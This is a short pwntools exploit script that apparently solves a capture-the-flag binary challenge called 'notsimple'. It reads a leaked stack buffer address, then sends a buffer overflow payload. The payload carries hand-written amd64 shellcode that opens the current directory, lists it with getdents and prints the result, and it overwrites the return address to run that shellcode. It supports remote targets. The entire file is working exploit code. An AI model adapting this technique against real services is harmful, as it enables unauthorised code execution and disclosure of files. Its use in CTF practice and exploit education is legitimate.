from pwn import *
import re

context.arch = 'amd64'
e = ELF("./src/notsimple")
if args.REMOTE:
    p = remote(args.HOST, int(args.PORT))
else:
    p = process("./src/notsimple")

NUM_TO_RET = 0x50 + 8
p.recvuntil(b"Oops, I'm leaking! ")
bufaddr = int(p.recvline(),16)
log.success(f"Address of buffer: {hex(bufaddr)}")
p.recvuntil(b"> ")
log.info(f"Building payload...")
# Our payload is to get directory listed, then print it out
assembly = f"mov rdi, {hex(bufaddr)} ; mov rsi,0x0; mov rax,0x2 ; syscall" # open .
assembly += "; mov rdi, rax ; mov rsi, 0x404100 ; mov rdx, 0x1024 ; mov rax,0x4e ; syscall" # getdents
assembly += "; mov rsi, 0x404100 ; mov rdi,0x1 ; mov rdx,0x100 ; mov rax,0x1 ; syscall" # dump data
shellcode = asm(assembly)
log.info(f"Shellcode address: {hex(bufaddr + 2)}")
payload = fit({0: b'.\x00', 2: shellcode, NUM_TO_RET: p64(bufaddr + 2)})
p.sendline(payload)

result = p.recv().decode('latin1')
print(re.findall(r'rarctf\{.*\}', result)[0])
